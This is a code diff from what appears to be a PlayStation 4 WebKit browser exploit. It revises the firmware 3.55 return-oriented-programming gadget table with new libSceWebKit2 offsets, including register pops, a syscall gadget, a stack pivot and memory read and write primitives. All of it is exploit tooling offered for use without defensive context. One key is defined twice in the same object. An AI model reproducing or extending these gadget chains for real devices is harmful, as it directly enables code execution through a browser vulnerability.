@@ -70,20 +70,25 @@ var generateGadgetMap = function()
 
     '3.55':
     {
-      'pop rsi':  getGadget('libSceWebKit2', 0xB9EBB),
-      'pop rdi':  getGadget('libSceWebKit2', 0x113991),
-      'pop rax':  getGadget('libSceWebKit2', 0x1C6AB),
-      'pop rcx':  getGadget('libSceWebKit2', 0x3CA9FD),
-      'pop rdx':  getGadget('libSceWebKit2', 0x1AFA),
-      'pop r8':   getGadget('libSceWebKit2', 0x4C13BD),
-      'pop r9':   getGadget('libSceWebKit2', 0xEE0A8F),
       'pop rsp':  getGadget('libSceWebKit2', 0x376850),
+      'pop rcx; pop rcx': getGadget('libSceWebKit2', 0x2017674),
+      'pop rcx': getGadget('libSceWebKit2', 0x1B49034),
+      'pop rdi': getGadget('libSceWebKit2', 0x142f00a),
+      'pop rsi': getGadget('libSceWebKit2', 0x1d7342c),
+      'pop rdx': getGadget('libSceWebKit2', 0x1b3ddf2),
+      'pop rax': getGadget('libSceWebKit2', 0x2017183),
+      'pop r8': getGadget('libSceWebKit2', 0x1036d79),
+      'pop r9': getGadget('libSceWebKit2', 0xee0a8f),
 
+      'syscall':  getGadget('libSceWebKit2', 0x2224BDA),
       'mov rax, rdi':             getGadget('libSceWebKit2', 0x57C3),
       'mov qword ptr [rdi], rax': getGadget('libSceWebKit2', 0x11FC37),
       'mov qword ptr [rdi], rsi': getGadget('libSceWebKit2', 0x4584D0),
-
       'jmp addr': getGadget('libSceWebKit2', 0x86D4F4),
+      'xchg rax, rsp; dec dword ptr [rax - 0x77]': getGadget('libSceWebKit2', 0xd5d841),
+      'add dword ptr [rax - 0x77], ecx': getGadget('libSceWebKit2', 0xd3d040),
+      'mov qword ptr [rdi], rax': getGadget('libSceWebKit2', 0x28e0e7),
+      'mov rax, qword ptr [rax]': getGadget('libSceWebKit2', 0x2723f3)
     },
 
     '3.70':
